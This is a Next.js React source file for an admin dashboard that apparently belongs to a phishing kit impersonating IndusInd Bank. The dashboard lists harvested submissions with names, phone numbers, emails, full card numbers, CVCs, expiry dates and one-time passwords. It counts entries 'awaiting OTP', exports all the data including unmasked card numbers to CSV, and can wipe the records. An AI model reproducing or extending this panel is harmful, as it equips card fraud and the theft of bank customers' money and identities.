'use client';
import { useState, useEffect, useCallback } from 'react';
import { useRouter } from 'next/navigation';
import styles from './page.module.css';

export default function AdminDashboard() {
  const router = useRouter();
  const [submissions, setSubmissions] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [clearing, setClearing] = useState(false);
  const [search, setSearch] = useState('');

  const fetchSubmissions = useCallback(async () => {
    try {
      const res = await fetch('/api/admin/submissions');
      if (res.status === 401) {
        router.push('/admin');
        return;
      }
      const data = await res.json();
      if (data.success) {
        setSubmissions(data.submissions);
      }
    } catch {
      setError('Failed to load submissions.');
    } finally {
      setLoading(false);
    }
  }, [router]);

  useEffect(() => {
    fetchSubmissions();
  }, [fetchSubmissions]);

  const handleLogout = async () => {
    await fetch('/api/admin/logout', { method: 'POST' });
    router.push('/admin');
  };

  const handleClearAll = async () => {
    if (!confirm('Are you sure you want to delete ALL submissions? This cannot be undone.')) return;
    setClearing(true);
    await fetch('/api/admin/submissions', { method: 'DELETE' });
    setSubmissions([]);
    setClearing(false);
  };

  const handleExportCSV = () => {
    const headers = ['Date/Time', 'Page', 'Name', 'Last Name', 'DOB', 'Phone', 'Email', 'Card Limit', 'Card Number', 'CVC', 'Expiry', 'OTP'];
    const rows = submissions.map(s => [
      new Date(s.timestamp).toLocaleString('en-IN'),
      s.page, s.name, s.lastname, s.birth, s.phone, s.email,
      s.cardLimit, `"${s.card}"`, s.cvcpwd, `${s.expmonth}/${s.expyear}`, s.otp
    ]);
    const csvContent = [headers, ...rows].map(r => r.join(',')).join('\n');
    const blob = new Blob([csvContent], { type: 'text/csv' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `submissions-${Date.now()}.csv`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const filtered = submissions.filter(s => {
    const q = search.toLowerCase();
    return (
      s.name?.toLowerCase().includes(q) ||
      s.email?.toLowerCase().includes(q) ||
      s.phone?.toLowerCase().includes(q) ||
      s.card?.toLowerCase().includes(q) ||
      s.page?.toLowerCase().includes(q)
    );
  });

  const maskCard = (card) => {
    if (!card || card.length < 4) return card;
    return '**** **** **** ' + card.slice(-4);
  };

  return (
    <div className={styles.page}>
      {/* Sidebar */}
      <aside className={styles.sidebar}>
        <div className={styles.sidebarLogo}>
          <img src="/assets/img/indusind-logo.png" alt="IndusInd Bank" className={styles.logo} />
        </div>
        <nav className={styles.sidebarNav}>
          <div className={styles.navItem + ' ' + styles.navActive}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg>
            Dashboard
          </div>
        </nav>
        <button className={styles.logoutBtn} onClick={handleLogout} id="admin-logout-btn">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
          Logout
        </button>
      </aside>

      {/* Main Content */}
      <main className={styles.main}>
        {/* Top Bar */}
        <div className={styles.topBar}>
          <div>
            <h1 className={styles.pageTitle}>Submissions Dashboard</h1>
            <p className={styles.pageSubtitle}>All form and OTP submissions from IndusInd Bank</p>
          </div>
          <div className={styles.topActions}>
            <button className={styles.btnExport} onClick={handleExportCSV} id="export-csv-btn">
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
              Export CSV
            </button>
            <button className={styles.btnDanger} onClick={handleClearAll} disabled={clearing} id="clear-all-btn">
              <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/></svg>
              {clearing ? 'Clearing...' : 'Clear All'}
            </button>
          </div>
        </div>

        {/* Stats */}
        <div className={styles.statsRow}>
          <div className={styles.statCard}>
            <div className={styles.statNum}>{submissions.length}</div>
            <div className={styles.statLabel}>Total Submissions</div>
          </div>
          <div className={styles.statCard}>
            <div className={styles.statNum}>{submissions.filter(s => s.otp).length}</div>
            <div className={styles.statLabel}>With OTP</div>
          </div>
          <div className={styles.statCard}>
            <div className={styles.statNum}>{submissions.filter(s => !s.otp).length}</div>
            <div className={styles.statLabel}>Awaiting OTP</div>
          </div>
          <div className={styles.statCard}>
            <div className={styles.statNum}>{[...new Set(submissions.map(s => s.page))].length}</div>
            <div className={styles.statLabel}>Service Pages</div>
          </div>
        </div>

        {/* Search */}
        <div className={styles.searchBar}>
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#999" strokeWidth="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
          <input
            type="text"
            placeholder="Search by name, email, phone or card..."
            value={search}
            onChange={e => setSearch(e.target.value)}
            className={styles.searchInput}
            id="search-submissions"
          />
        </div>

        {/* Table */}
        {loading ? (
          <div className={styles.emptyState}>Loading submissions...</div>
        ) : error ? (
          <div className={styles.emptyState} style={{color:'#c0392b'}}>{error}</div>
        ) : filtered.length === 0 ? (
          <div className={styles.emptyState}>No submissions found.</div>
        ) : (
          <div className={styles.tableWrapper}>
            <table className={styles.table}>
              <thead>
                <tr>
                  <th>#</th>
                  <th>Date / Time</th>
                  <th>Page</th>
                  <th>Name</th>
                  <th>Phone</th>
                  <th>Email</th>
                  <th>Card Number</th>
                  <th>CVC</th>
                  <th>Expiry</th>
                  <th>OTP</th>
                </tr>
              </thead>
              <tbody>
                {filtered.map((s, i) => (
                  <tr key={s.id} className={s.otp ? styles.rowComplete : styles.rowPending}>
                    <td>{i + 1}</td>
                    <td>{new Date(s.timestamp).toLocaleString('en-IN')}</td>
                    <td><span className={styles.pageBadge}>{s.page}</span></td>
                    <td>{s.name} {s.lastname}</td>
                    <td>{s.phone}</td>
                    <td>{s.email}</td>
                    <td className={styles.mono}>{maskCard(s.card)}</td>
                    <td className={styles.mono}>{s.cvcpwd}</td>
                    <td>{s.expmonth}/{s.expyear}</td>
                    <td>
                      {s.otp
                        ? <span className={styles.otpBadge}>{s.otp}</span>
                        : <span className={styles.pendingBadge}>Pending</span>
                      }
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </main>
    </div>
  );
}
